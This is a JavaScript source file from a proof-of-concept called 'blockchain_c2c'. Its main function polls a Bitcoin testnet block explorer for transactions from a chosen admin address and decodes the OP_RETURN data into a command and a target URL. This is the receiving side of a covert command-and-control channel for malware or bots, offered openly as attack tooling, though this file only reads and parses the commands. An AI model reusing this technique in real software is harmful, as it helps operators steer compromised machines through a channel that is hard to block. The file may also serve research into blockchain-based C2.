/**
This file is part of a blockchain_c2c PoC.

blockchain_c2c is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Foobar is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
*/

function performHTTPGet(url, content_type) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", url, false);

    if (content_type) {
        xhttp.setRequestHeader("Content-type", content_type);
    }

    xhttp.send();
    // To collect the information appropiately parsed:
    // var response = JSON.parse(xhttp.responseText);
    return xhttp.responseText;
}

function hex_to_ascii(str1) {
    var hex  = str1.toString();
    var str = '';
    for (var n = 0; n < hex.length; n += 2) {
        str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
    }
    return str;
 }

function getDataFromBlockchain(monitor_address, admin_address) {
    // Building the URL
    var url = "https://testnet.blockexplorer.com/api/txs/?address=" + monitor_address;

    console.log("URL to be queried: " + url);
    // Recovering the information
    var data = performHTTPGet(url);
    // Parsing the data into a dictionary
    var response = JSON.parse(data);

    var info = {
        "response" : "",
        "command" : "",
        "url" : "",
    };

    for (i=0; i<response.txs.length; i++)  {
        var tx = response.txs[i];
        var is_admin = false;

        for (j=0; j<tx["vin"].length; j++) {
            if (tx["vin"][j]["addr"] == admin_address) {
                is_admin = true;
            }
        }

        // Exiting this transaction if no admin found
        if (is_admin) {
            for (j=0; j<tx["vout"].length; j++) {
                var v = tx["vout"][j];

                if (v["scriptPubKey"]["asm"].indexOf("OP_RETURN") != -1) {
                    var command_hex = v["scriptPubKey"]["asm"].split(" ")[1];
                    var command_str = hex_to_ascii(command_hex);
                    info["command"] = command_str;

                    // Grabbing the target url
                    var url_dst = command_str.split(" ").pop();
                    info["url"] = url_dst;
                    console.log("COMMAND: "+  info["command"]);
                    return info;
                }
            }
        }
    }
    return info;
}
